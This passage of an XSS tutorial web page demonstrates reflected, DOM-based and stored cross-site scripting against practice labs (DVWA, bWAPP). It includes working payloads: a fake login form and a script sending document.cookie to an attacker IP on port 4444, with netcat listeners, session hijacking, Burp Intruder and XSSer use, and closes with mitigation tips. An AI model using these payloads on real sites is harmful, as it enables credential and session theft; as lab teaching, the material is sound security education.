+<pre class="wp-block-preformatted">get.php?search=&lt;script&gt;alert("Welcome to hacking Articles!!")&lt;/script&gt;</pre>
+
+
+
+<p>Great!!From the below screenshot, you can see that we got the alert reflected as&nbsp;<strong><em>&ldquo;Welcome to Hacking Articles!!&rdquo;</em></strong></p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="540" height="263" src="../../../../wp-content/uploads/2024/12/12-4.png" alt="" class="wp-image-9061"></figure>
+
+
+
+<p>Wonder why this all happened, let&rsquo;s check out the following code snippet.</p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="329" height="179" src="../../../../wp-content/uploads/2024/12/13.0.png" alt="" class="wp-image-9056"></figure>
+
+
+
+<p>With the ease to reflect the&nbsp;<strong>message</strong>&nbsp;on the screen, the developer didn&rsquo;t set up any input validation over at the&nbsp;<strong>ignite function</strong>&nbsp;and he simply&nbsp;<strong>&ldquo;echo&rdquo;</strong>&nbsp;the&nbsp;<em>&ldquo;Search Message&rdquo;</em>&nbsp;with&nbsp;<strong><em>ignite($search)</em></strong>&nbsp;through the&nbsp;<strong>&ldquo;$_GET&rdquo;</strong>&nbsp;variable.</p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="687" height="169" src="../../../../wp-content/uploads/2024/12/13.1.png" alt="" class="wp-image-9058"></figure>
+
+
+
+<p><strong><u>DOM-Based</u></strong><strong>&nbsp;<u>XSS</u></strong></p>
+
+
+
+<p>The&nbsp;<strong>DOM</strong>&ndash;<strong>Based</strong>&nbsp;<strong>Cross</strong>&ndash;<strong>Site</strong>&nbsp;<strong>Scripting</strong>&nbsp;is the vulnerability which appears up in a Document Object Model rather than in the HTML pages.</p>
+
+
+
+<p>But what is this&nbsp;<strong><em>Document Object Model</em></strong>?</p>
+
+
+
+<p>A&nbsp;<strong>DOM&nbsp;</strong>or a&nbsp;<strong>D</strong>ocument&nbsp;<strong>Ob</strong>ject&nbsp;<strong>M</strong>odel describes up the different web-page segments like &ndash;&nbsp;&nbsp;title, headings, tables, forms, etc. and even the hierarchical structure of an HTML page. Thus, this API increases the skill of the developers to produce and change&nbsp;HTML&nbsp;and&nbsp;XML&nbsp;documents as programming&nbsp;objects.</p>
+
+
+
+<p>When an&nbsp;<strong>HTML</strong>&nbsp;<strong>document</strong>&nbsp;is loaded into a web browser, it becomes a&nbsp;<strong>&ldquo;Document</strong>&nbsp;<strong>Object&rdquo;</strong>.</p>
+
+
+
+<p>However, this document object is the&nbsp;<strong>root</strong>&nbsp;<strong>node</strong>&nbsp;of the HTML documents and the&nbsp;<strong>&ldquo;owner&rdquo;</strong>&nbsp;of all other nodes.</p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="673" height="344" src="../../../../wp-content/uploads/2024/12/13-4.png" alt="" class="wp-image-9065"></figure>
+
+
+
+<p>With the object model, JavaScript gets all the power it needs to create dynamic HTML:</p>
+
+
+
+<p>&sect;&nbsp;&nbsp;JavaScript can change all the HTML elements in the page</p>
+
+
+
+<p>&sect;&nbsp;&nbsp;JavaScript can change all the HTML attributes in the page</p>
+
+
+
+<p>&sect;&nbsp;&nbsp;JavaScript can change all the CSS styles in the page</p>
+
+
+
+<p>&sect;&nbsp;&nbsp;JavaScript can remove existing HTML elements and attributes</p>
+
+
+
+<p>&sect;&nbsp;&nbsp;JavaScript can add new HTML elements and attributes</p>
+
+
+
+<p>&sect;&nbsp;&nbsp;JavaScript can react to all existing HTML events in the page</p>
+
+
+
+<p>&sect;&nbsp;&nbsp;JavaScript can create new HTML events on the page</p>
+
+
+
+<p>Therefore DOM manipulation is itself is not a problem, but when JavaScript handles data insecurely in the DOM, thus it enables up various attacks.</p>
+
+
+
+<p><strong>DOM-based XSS&nbsp;</strong>vulnerabilities usually arise when JavaScript takes data from an attacker-controllable&nbsp;<strong>source</strong><em>, such as the URL</em>, and passes it to a&nbsp;<strong>sink (</strong>a dangerous JavaScript function or DOM object&nbsp;<em>as eval()</em><strong>)</strong>&nbsp;that supports dynamic code execution.</p>
+
+
+
+<p><em>This is quite different from&nbsp;<strong>reflected</strong>&nbsp;and&nbsp;<strong>stored</strong>&nbsp;<strong>XSS</strong>&nbsp;because over in this attack, the developer cannot find the malicious script in HTML source code as well as in HTML response, it can be observed at execution time.</em></p>
+
+
+
+<p>The DOM-Based XSS exploits these problems on the user&rsquo;s local machines in this way:</p>
+
+
+
+<p>&ndash; The attacker creates a well-built malicious website</p>
+
+
+
+<p>&ndash; The ingenious user opens that sites</p>
+
+
+
+<p>&ndash; The user has a vulnerable page on his machine</p>
+
+
+
+<p>&ndash; The attacker&rsquo;s website sends commands to the vulnerable HTML page</p>
+
+
+
+<p>&ndash; The vulnerable local page executes that commands with the user&rsquo;s privileges on that machine.</p>
+
+
+
+<p>&ndash; The attacker easily gains control of the victim computer.</p>
+
+
+
+<p>Didn&rsquo;t understand well, let&rsquo;s check out a DOM-based XSS exploitation.</p>
+
+
+
+<p>The following application was thereby vulnerable to DOM-based XSS attack. The web application further permits its users to opt a language with the following displayed options and thus executes the input through its URL.</p>
+
+
+
+<pre class="wp-block-preformatted">../../../../DVWA/vulnerabilities/xss_d/index.html?default=English</pre>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="541" height="285" src="../../../../wp-content/uploads/2024/12/14-3.png" alt="" class="wp-image-9073"></figure>
+
+
+
+<p>From the above screenshot, you can see that we do not have any specific section where we could include our malicious code. Therefore, in order to deface this web-application, we&rsquo;ll now manipulate up the&nbsp;<strong>&ldquo;URL&rdquo;</strong>&nbsp;as it is the most common&nbsp;<strong>source</strong>&nbsp;for the&nbsp;<strong>DOM</strong>&nbsp;<strong>XSS.</strong></p>
+
+
+
+<pre class="wp-block-preformatted">../../../../DVWA/vulnerabilities/xss_d/index.html?default=English#&lt;script&gt;alert("This is DOM XSS");&lt;/script&gt;</pre>
+
+
+
+<p>After manipulating up the URL, hit enter. Now,&nbsp;&nbsp;we&rsquo;ll again choose up the language and as we fire up the select button, the browser executes up the code in the URL and pops out the&nbsp;<strong>DOM</strong>&nbsp;<strong>XSS</strong>&nbsp;<strong>alert</strong>.</p>
+
+
+
+<p>The major difference between&nbsp;<strong>DOM-based XSS</strong>&nbsp;and&nbsp;<strong>Reflected</strong>&nbsp;or&nbsp;<strong>Stored XSS</strong>&nbsp;is that it cannot be stopped by server-side filters because anything written after the&nbsp;&ldquo;#&rdquo; (hash) will never forward to the server.</p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="576" height="282" src="../../../../wp-content/uploads/2024/12/15-2.png" alt="" class="wp-image-9069"></figure>
+
+
+
+<p><strong>Cross-Site Scripting Exploitation</strong></p>
+
+
+
+<p>I&rsquo;m sure you might be wondering that&nbsp;<em>&ldquo;Okay, we got the pop-up, but now what? What we could do with this? I&rsquo;ll click the OK button and this pop-up will go.&rdquo;</em></p>
+
+
+
+<p>But this pop-up speaks about a thousand words. Let&rsquo;s&nbsp;<strong>take a U-turn&nbsp;</strong>and get back to the place, where we got our first pop-up; Yes over at the Stored Section.</p>
+
+
+
+<p><strong><u>Credential</u></strong><strong>&nbsp;<u>Capturing</u></strong></p>
+
+
+
+<p>So, as we are now aware of the fact that whenever a user submits up his feedback, it will get stored directly into the server&rsquo;s database. And if the attacker manipulates the feedback with an&nbsp;<strong>&ldquo;alert message&rdquo;,</strong>&nbsp;thus even the alert will get stored into it, and it pops up every time, whenever some other user visits the application&rsquo;s web-page.</p>
+
+
+
+<p>But what, if rather than a pop-up the user is welcomed with a&nbsp;&nbsp;login page?</p>
+
+
+
+<p>Let&rsquo;s try to solve this by injecting a malicious payload that will&nbsp;<em><strong>create</strong></em><em>&nbsp;up a fake user&nbsp;</em><strong><em>login form&nbsp;</em></strong>on the web page, which will thus forward the captured request over to<strong>&nbsp;the attacker&rsquo;s IP</strong>.</p>
+
+
+
+<p>So, let&rsquo;s includes the following script over at the feedback field in the web-application</p>
+
+
+
+<pre class="wp-block-preformatted">&lt;div style="position: absolute; left: 0px; top: 0px; background-color:#fddacd;width: 1900px; height: 1300px;"&gt;&lt;h2&gt;Please login to continue!!&lt;/h2&gt;
+&lt;br&gt;&lt;form name="login" action="http://192.168.0.9:4444/login.htm"&gt;
+&lt;table&gt;&lt;tr&gt;&lt;td&gt;Username:&lt;/td&gt;&lt;td&gt;&lt;input type="text" name="username"/&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Password:&lt;/td&gt;
+&lt;td&gt;&lt;input type="password" name="password"/&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;
+&lt;td colspan=2 align=center&gt;&lt;input type="submit" value="Login"/&gt;&lt;/td&gt;&lt;/tr&gt;
+&lt;/table&gt;&lt;/form&gt;</pre>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="581" height="289" src="../../../../wp-content/uploads/2024/12/16-1.png" alt="" class="wp-image-9087"></figure>
+
+
+
+<p>Now this malicious code has been stored into the web application&rsquo;s database.</p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="394" height="236" src="../../../../wp-content/uploads/2024/12/17-1.png" alt="" class="wp-image-9067"></figure>
+
+
+
+<p>Over at some other browser, think when a user tries to submit the feedback.</p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="683" height="313" src="../../../../wp-content/uploads/2024/12/18-1.png" alt="" class="wp-image-9091"></figure>
+
+
+
+<p>As soon as she hit the submit button, the browser executes up the script and he got welcomed with login form as&nbsp;<strong>&ldquo;Please login to continue!!&rdquo;</strong>.</p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="395" height="245" src="../../../../wp-content/uploads/2024/12/19-1.png" alt="" class="wp-image-9068"></figure>
+
+
+
+<p>Over on the other side, let&rsquo;s enable our listener as with</p>
+
+
+
+<pre class="wp-block-preformatted">nc &ndash;lvp 4444</pre>
+
+
+
+<p>Now, as when she enters up her credentials, the scripts will boot up again and the entered credentials will travel to the attacker&rsquo;s listener.</p>
+
+
+
+<p>Cool!! From the below screenshot, you can see that we&rsquo;ve successfully captured up the victim&rsquo;s credentials.</p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="620" height="222" src="../../../../wp-content/uploads/2024/12/21-1.png" alt="" class="wp-image-9079"></figure>
+
+
+
+<p><strong><u>Cookie</u></strong><strong>&nbsp;<u>Capturing</u></strong></p>
+
+
+
+<p>There are times when an attacker needs&nbsp;<strong>authenticated</strong>&nbsp;<strong>cookies</strong>&nbsp;of a logged-in user either to access his account or for some other malicious purpose.</p>
+
+
+
+<p>So let&rsquo;s see how this XSS vulnerability empowers the attackers to capture the session cookies and how the attacker abuses them in order to get into the user&rsquo;s account.</p>
+
+
+
+<p>I&rsquo;ve opened the vulnerable web-application&nbsp;<strong>&ldquo;DVWA&rdquo;</strong>&nbsp;over in my browser and logged-in inside with&nbsp;<strong>admin: password.&nbsp;</strong>Further, from the left-hand panel I&rsquo;ve opted the vulnerability as&nbsp;<strong>XSS (Stored),&nbsp;</strong>over for this time let&rsquo;s keep the security to&nbsp;<strong>low</strong>.</p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="621" height="265" src="../../../../wp-content/uploads/2024/12/22-1.png" alt="" class="wp-image-9066"></figure>
+
+
+
+<p>Let&rsquo;s enter our malicious payload over into the &ldquo;Message&rdquo; section, but before that, we need to increase the length of text-area as it is not sufficient to inject our payload. Therefore, open up the&nbsp;<strong>inspect element tab by hitting&nbsp;<em>&ldquo;Ctrl + I&rdquo;</em></strong>&nbsp;to view it&rsquo;s given message length for the text area and then further change the message&nbsp;<strong>maxlength</strong>&nbsp;<strong>field</strong>&nbsp;from 50 -150.</p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="646" height="364" src="../../../../wp-content/uploads/2024/12/23-1.png" alt="" class="wp-image-9064"></figure>
+
+
+
+<p>Over in the following screenshot, you can see that I have injected the script which will thus capture up the cookie and will send the response to our listener when any user visits this page.</p>
+
+
+
+<pre class="wp-block-preformatted">&lt;script&gt;new Image().src="http://192.168.0.9:4444?output="+document.cookie;&lt;/script&gt;</pre>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="617" height="225" src="../../../../wp-content/uploads/2024/12/24-1.png" alt="" class="wp-image-9062"></figure>
+
+
+
+<p>Now, on the other side, let&rsquo;s set up our Netcat listener as with</p>
+
+
+
+<pre class="wp-block-preformatted">nc &ndash;lvp 4444</pre>
+
+
+
+<p><strong>Logout</strong>&nbsp;and&nbsp;<strong>login</strong>&nbsp;<strong>again&nbsp;</strong>as a new user or in some other browser, now if the user visits the&nbsp;<strong>XSS (Stored)&nbsp;</strong>page, his session cookies will thus get transferred to our listener</p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="666" height="296" src="../../../../wp-content/uploads/2024/12/25.0.png" alt="" class="wp-image-9063"></figure>
+
+
+
+<p>Great!! From the below screenshot you can see that, we&rsquo;ve successfully captured up the authenticated cookies.</p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="771" height="170" src="../../../../wp-content/uploads/2024/12/25-1.png" alt="" class="wp-image-9084"></figure>
+
+
+
+<p>But what we could do with them?</p>
+
+
+
+<p>Let&rsquo;s try to get into his account. I&rsquo;ve opened up DVWA again but this time, we won&rsquo;t log in, rather I&rsquo;ll get with the captured cookies. I&rsquo;ve used the&nbsp;<strong>cookie</strong>&nbsp;<strong>editor</strong>&nbsp;plugin in order to manipulate up the session.</p>
+
+
+
+<p>From the below screenshot, you can see that,&nbsp;<strong>I&rsquo;ve changed the PHPSESID</strong>&nbsp;with the one I captured and had manipulated the&nbsp;<strong>security from impossible to low</strong>&nbsp;and even decreased the&nbsp;<strong>security _level from 1 to 0&nbsp;</strong>and have thus saved up these changes. Let&rsquo;s even manipulate the URL by removing&nbsp;<strong>login.php</strong></p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="771" height="416" src="../../../../wp-content/uploads/2024/12/26-1.png" alt="" class="wp-image-9080"></figure>
+
+
+
+<p>Great!! Now simply reloads the page, from the screenshot you can see are that we are into the application.</p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="674" height="371" src="../../../../wp-content/uploads/2024/12/27-1.png" alt="" class="wp-image-9089"></figure>
+
+
+
+<p><strong>Exploitation with Burpsuite</strong></p>
+
+
+
+<p>Stored XSS is hard to find, but over on the other hand, Reflected XSS is very common and thus can be exploited with some simple clicks.</p>
+
+
+
+<p><em>But wait, up till now we were only exploiting the web-applications that were not validated by the developers, so what about the restricted ones?</em></p>
+
+
+
+<p>Web applications with the input fields are somewhere or the other vulnerable to XSS, but we can&rsquo;t exploit them with the bare hands, as they were secured up with some validations. Therefore in order to exploit such validated applications, we need some fuzzing tools and thus for the fuzzing thing, we can count on&nbsp;<strong>BurpSuite</strong>.</p>
+
+
+
+<p>I&rsquo;ve opened the target IP in my browser and login inside BWAPP as a&nbsp;<strong>bee: bug</strong>, further I&rsquo;ve set the&nbsp;<strong>&ldquo;Choose Your Bug&rdquo;</strong>&nbsp;option to&nbsp;<strong>&ldquo;</strong><em><strong>XSS &ndash;Reflected (Post)&rdquo;&nbsp;</strong></em>and had fired up the&nbsp;<strong>hack button, and for this section, I&rsquo;ve set the security to &ldquo;medium&rdquo;</strong></p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="573" height="515" src="../../../../wp-content/uploads/2024/12/28-1.png" alt="" class="wp-image-9081"></figure>
+
+
+
+<p>From the below screenshot, you can see that when we tried to execute our payload as&nbsp;<strong>&lt;script&gt;alert(&ldquo;hello&rdquo;)&lt;/script&gt;,</strong>&nbsp;we hadn&rsquo;t got our desired result.</p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="579" height="309" src="../../../../wp-content/uploads/2024/12/29.png" alt="" class="wp-image-9059"></figure>
+
+
+
+<p>So, let&rsquo;s capture its ongoing&nbsp;<strong>HTTP</strong>&nbsp;<strong>Request</strong>&nbsp;in our burpsuite and will further share the captured request over to the&nbsp;<strong>&ldquo;Intruder&rdquo;.</strong></p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="650" height="351" src="../../../../wp-content/uploads/2024/12/30.png" alt="" class="wp-image-9070"></figure>
+
+
+
+<p>Over into the&nbsp;<strong>intruder,&nbsp;</strong>&nbsp;switch to the&nbsp;<strong>Position</strong>&nbsp;<strong>tab</strong>&nbsp;and we&rsquo;ll configure the position to our input-value parameter as&nbsp;<strong>&ldquo;firstname&rdquo;</strong>&nbsp;with the&nbsp;<strong><em>Add $</em>&nbsp;</strong>button<strong>.</strong></p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="655" height="468" src="../../../../wp-content/uploads/2024/12/31.png" alt="" class="wp-image-9085"></figure>
+
+
+
+<p>Time to include our payloads file. Click on the&nbsp;<strong>load</strong>&nbsp;button in order to add the dictionary<em>. You can even opt the burpsuite&rsquo;s predefined XSS dictionary with a simple click on the&nbsp;<strong>&ldquo;Add from list&rdquo;&nbsp;</strong>button and selecting the&nbsp;<strong>Fuzzing-XSS</strong>.</em></p>
+
+
+
+<p>As soon as we&rsquo;re over with the configuration, we&rsquo;ll fire up the&nbsp;<strong>&ldquo;Start Attack&rdquo;</strong>&nbsp;button.</p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="641" height="502" src="../../../../wp-content/uploads/2024/12/32.png" alt="" class="wp-image-9077"></figure>
+
+
+
+<p>From the below image, you can see that our attack has been started and there is a fluctuation in the length section. In order to get the result in the descending order with respect to the length, I&rsquo;ve double-clicked the length field.</p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="516" height="389" src="../../../../wp-content/uploads/2024/12/33.png" alt="" class="wp-image-9078"></figure>
+
+
+
+<p>We&rsquo;re almost done, let&rsquo;s double click on any payload in order to check what it offers.</p>
+
+
+
+<p>But wait!! We can&rsquo;t see the XSS result over in the response tab as the browser can only render this malicious code, so in order to check its response let&rsquo;s&nbsp;<strong>simply do a right-click</strong>&nbsp;and choose the option as&nbsp;<strong>&ldquo;Show Response in browser&rdquo;</strong></p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="614" height="367" src="../../../../wp-content/uploads/2024/12/34.png" alt="" class="wp-image-9071"></figure>
+
+
+
+<p>Copy the offered URL and paste it in the browser. Great!! From the below image, you can see that we&rsquo;ve successfully bypassed the application as we got the&nbsp;<strong>alert</strong>.</p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="563" height="303" src="../../../../wp-content/uploads/2024/12/35.png" alt="" class="wp-image-9086"></figure>
+
+
+
+<p><strong>XSSer</strong></p>
+
+
+
+<p><strong>C</strong>ross-<strong>S</strong>ite&nbsp;<strong>&ldquo;S</strong>cripter<strong>&rdquo;</strong>&nbsp;or an&nbsp;<strong>&ldquo;XSSer&rdquo;&nbsp;</strong>is an automatic framework, which detects&nbsp;<strong>XSS&nbsp;</strong>vulnerabilities over in the web-applications and even provides up several options to exploit them.</p>
+
+
+
+<p>XSSer has more than&nbsp;<strong>1300</strong>&nbsp;pre-installed XSS fuzzing vectors which thus empowers the attacker to bypass certainly filtered web-applications and the WAF&rsquo;s(Web &ndash;Application Firewalls).</p>
+
+
+
+<p>So, let&rsquo;s see how this fuzzer could help us in exploiting our bWAPP&rsquo;s web-application. But in order to go ahead, we need to clone XSSer into our kali machine, so let&rsquo;s do it with</p>
+
+
+
+<pre class="wp-block-preformatted">git clone https://github.com/epsylon/xsser.git</pre>
+
+
+
+<p>Now, boot back into your bWAPP, and set the&nbsp;<strong>&ldquo;Choose your Bug&rdquo;</strong>&nbsp;option to&nbsp;<strong>&ldquo;</strong><em><strong>XSS &ndash;Reflected (Get)&rdquo;&nbsp;</strong></em><em>&nbsp;and hit the&nbsp;<strong>hack&nbsp;</strong>button and for this time we&rsquo;ll set the security level to&nbsp;<strong>&ldquo;medium&rdquo;.</strong></em></p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="722" height="514" src="../../../../wp-content/uploads/2024/12/99.png" alt="" class="wp-image-9094"></figure>
+
+
+
+<p><em>XSSer offers us two platforms &ndash; the&nbsp;<strong>GUI&nbsp;</strong>and the&nbsp;<strong>Command-Line.&nbsp;</strong>Therefore, for this section, we&rsquo;ll focus on the Command Line method.</em></p>
+
+
+
+<p><em>As the&nbsp;<strong>XSS</strong>&nbsp;<strong>vulnerability</strong>&nbsp;is&nbsp;<strong>dependable</strong>&nbsp;on the&nbsp;<strong>input</strong>&nbsp;<strong>parameters</strong>, thus this&nbsp;<strong>XSSer&nbsp;</strong>works on &ldquo;URL&rdquo;; and even to get the precise result we need the cookies too. In order to grab both the things, I&rsquo;ve made a dry run by setting up the&nbsp;<strong>firstname</strong>&nbsp;as&nbsp;<strong>&ldquo;test&rdquo;&nbsp;</strong>and the&nbsp;<strong>lastname&nbsp;</strong>as&nbsp;<strong>&ldquo;test1&rdquo;.</strong></em></p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="550" height="357" src="../../../../wp-content/uploads/2024/12/100.png" alt="" class="wp-image-9083"></figure>
+
+
+
+<p>Now, let&rsquo;s capture the&nbsp;<strong>browser&rsquo;s request</strong>&nbsp;into our burpsuite, by simply enabling the proxy and the intercept options, further as we hit the&nbsp;<strong>Go&nbsp;</strong>button, we got the output as</p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="536" height="266" src="../../../../wp-content/uploads/2024/12/101.png" alt="" class="wp-image-9072"></figure>
+
+
+
+<p>Fire up you Kali Terminal with&nbsp;<strong>XSSer&nbsp;</strong>and run the following command with the&nbsp;<strong>&ndash;url&nbsp;</strong>and the&nbsp;<strong>&ndash;cookie flags.&nbsp;</strong>Here I&rsquo;ve even used an &ndash;auto flag which will thus check the URL with all the preloaded vectors. Over at the applied URL, we need to manipulate an input-parameter value to &ldquo;XSS&rdquo;, as in our case I&rsquo;ve changed the &ldquo;test&rdquo; with &ldquo;XSS&rdquo;<strong>.</strong></p>
+
+
+
+<pre class="wp-block-preformatted">python3 xsser --url "http://192.168.0.9/bWAPP/xss_get.php?firstname=XSS&amp;lastname=test1&amp;form=submit" --cookie "PHPSESSID=q6t1k21lah0ois25m0b4egps85; security_level=1" --auto</pre>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="892" height="85" src="../../../../wp-content/uploads/2024/12/102.png" alt="" class="wp-image-9074"></figure>
+
+
+
+<p>Oops!! From the below screenshot, you can see that this URL is vulnerable with 1287 vectors.</p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="629" height="361" src="../../../../wp-content/uploads/2024/12/104.png" alt="" class="wp-image-9075"></figure>
+
+
+
+<p>The best thing about this fuzzer is that it provides up the browser&rsquo;s URL. Select and execute anyone and there you go.</p>
+
+
+
+<p><strong>Note</strong>:</p>
+
+
+
+<p><em>It is not necessary that with every payload, you&rsquo;ll get the alert pop-up, as every different payload is defined up with some specific event, whether it is setting up an iframe, capturing up some cookies, or redirection to some other website or something else.&nbsp;&nbsp;&nbsp;&nbsp;</em></p>
+
+
+
+<p>Therefore, from the below screenshot, it is clear that we&rsquo;ve successfully defaced this web-application<strong>.</strong></p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="681" height="392" src="../../../../wp-content/uploads/2024/12/105.png" alt="" class="wp-image-9088"></figure>
+
+
+
+<p><strong>Mitigation Steps</strong></p>
+
+
+
+<p>&middot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Developers should implement a&nbsp;<strong>whitelist of allowable inputs</strong>, and if not possible then there should be some&nbsp;<strong>input</strong>&nbsp;<strong>validations</strong>&nbsp;and the data entered by the user must be filtered as much as possible.</p>
+
+
+
+<p>&middot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Output encoding is the most reliable solution to combat XSS i.e. it takes up the script code and thus converts it into the plain text.</p>
+
+
+
+<p>&middot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A&nbsp;<strong>WAF&nbsp;</strong>or a&nbsp;<strong>W</strong>eb&nbsp;<strong>A</strong>pplication&nbsp;<strong>F</strong>irewall should be implemented as it somewhere protects the application from&nbsp;<strong>XSS attacks.</strong></p>
+
+
+
+<p>&middot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Use of&nbsp;<strong>HTTPOnly</strong>&nbsp;<strong>Flags</strong>&nbsp;on the Cookies.</p>
+
+
+
+<p>&middot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The developers can use&nbsp;<strong>C</strong>ontent&nbsp;<strong>S</strong>ecurity&nbsp;<strong>P</strong>olicy&nbsp;<strong>(CSP)</strong>&nbsp;to reduce the severity of any XSS vulnerabilities</p>
+	</div><!-- .entry-content -->
+
+	<footer class="entry-footer clearfix">
+		<span class="cat-links">Posted in <a href="../../../../category/sql-botnets-and-xss-attacks-tools-and-resources/index.html" rel="category tag">SQL, Botnets and XSS Attacks Tools and Resources</a></span>	</footer><!-- .entry-footer -->
+		
+	
+	<nav class="navigation post-navigation" aria-label="Posts">
+		<h2 class="screen-reader-text">Post navigation</h2>
+		<div class="nav-links"><div class="nav-previous"><a href="../database-penetration-testing-using-sqlmap/index.html" rel="prev"><i class="fa fa-arrow-alt-circle-left"></i><span class="nav-title">Database Penetration Testing using Sqlmap</span></a></div><div class="nav-next"><a href="../web-server-lab-setup-for-penetration-testing/index.html" rel="next"><span class="nav-title">Web Server Lab Setup for Penetration Testing</span><i class="fa fa-arrow-alt-circle-right"></i></a></div></div>
+	</nav>			
+</article><!-- #post-9053 -->
+	</main><!-- #main --> 
+
+
+<aside id="secondary" class="widget-area d-none">
+	<section id="block-4" class="widget widget_block">
+<div class="wp-block-group"><div class="wp-block-group__inner-container is-layout-flow wp-block-group-is-layout-flow"></div></div>
+</section><section id="block-5" class="widget widget_block">
+<div class="wp-block-group"><div class="wp-block-group__inner-container is-layout-flow wp-block-group-is-layout-flow"></div></div>
+</section><section id="block-6" class="widget widget_block">
+<div class="wp-block-group"><div class="wp-block-group__inner-container is-layout-flow wp-block-group-is-layout-flow"></div></div>
+</section></aside><!-- #secondary -->
+	</div><!--#.row-->
+	</div><!--.container-->	<footer id="footer-widgets">
+	<div class="container">
+		<div class="row">
+											</div>
+	</div>
+</footer>	<button class="backToTopBtn">
+  <img id="scroll" src="../../../../wp-content/themes/ph-news-feed/design-files/images/arrow-up.png">
+</button>
+
+<footer id="colophon" class="site-footer">
+	<div class="site-info">
+		  
+		<span class="sep"></span>
+			 <a rel="nofollow" href=""></a>.	</div><!-- .site-info -->
+</footer><!-- #colophon -->	</div><!-- #page -->
+
+<div id="sidr">
+	<button class="go-to-bottom"><i class="fa fa-down"></i></button>
+	<button id="close-menu" class="toggle-menu-link"><i class="fa fa-times"></i></button>
+	<form role="search" method="get" class="search-form" action="../../../../index.html">
+				<label>
+					<span class="screen-reader-text">Search for:</span>
+					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s">
+				</label>
+				<input type="submit" class="search-submit" value="Search">
+			</form>		<div class="sidr-menu-wrapper">
+		<div id="mobile-menu-sidr" class="menu"></div>
+	</div>
+	<button class="go-to-top"><i class="fa fa-up"></i></button>
+	
+</div>    <div id="amm_drcfw_toast_msg"></div>
+            <script>
+                jQuery(function($){
+
+                    
+                                    });
+            </script>
+            <div id="fb-root"></div>
+                    <style>
+
+            .wpdm-popover {
+                transition: all ease-in-out 400ms;
+                position: relative;display: inline-block;
+            }
+
+            .wpdm-popover .wpdm-hover-card {
+                position: absolute;
+                left: 0;
+                bottom: 50px;
+                width: 100%;
+                transition: all ease-in-out 400ms;
+                margin-bottom: 28px;
+                opacity: 0;
+                z-index: -999999;
+            }
+
+            .wpdm-popover:hover .wpdm-hover-card {
+                transition: all ease-in-out 400ms;
+                opacity: 1;
+                z-index: 999999;
+                bottom: 0px;
+            }
+
+            .wpdm-popover .wpdm-hover-card.hover-preview img {
+                width: 104px;
+                border-radius: 3px;
+            }
+
+            .wpdm-popover .card .card-footer{
+                background: rgba(0,0,0,0.02);
+            }
+
+            .packinfo {
+                margin-top: 10px;
+                font-weight: 400;
+                font-size: 14px;
+            }
+        </style>
+        <script>
+            jQuery(function ($) {
+                $('a[data-show-on-hover]').on('hover', function () {
+                    $($(this).data('show-on-hover')).fadeIn();
+                });
+            });
+        </script>
+                <div class="w3eden">
+            <div id="wpdm-popup-link" class="modal fade">
+                <div class="modal-dialog" style="width: 750px">
+                    <div class="modal-content">
+                        <div class="modal-header">
+                              <h4 class="modal-title"></h4>
+                        </div>
+                        <div class="modal-body" id="wpdm-modal-body">
+
+                        </div>
+                        <div class="modal-footer">
+                            <button type="button" class="btn btn-danger" data-dismiss="modal">Close</button>
+                        </div>
+                    </div><!-- /.modal-content -->
+                </div><!-- /.modal-dialog -->
+            </div><!-- /.modal -->
+
+
+        </div>
+        <script language="JavaScript">
+            <!--
+            jQuery(function () {
+                jQuery('.wpdm-popup-link').click(function (e) {
+                    e.preventDefault();
+                    jQuery('#wpdm-popup-link .modal-title').html(jQuery(this).data('title'));
+                    jQuery('#wpdm-modal-body').html('<i class="icon"><img align="left" style="margin-top: -1px" src="../../../../wp-content/plugins/download-manager/assets/images/loading-new.gif" />&nbsp;Please Wait...');
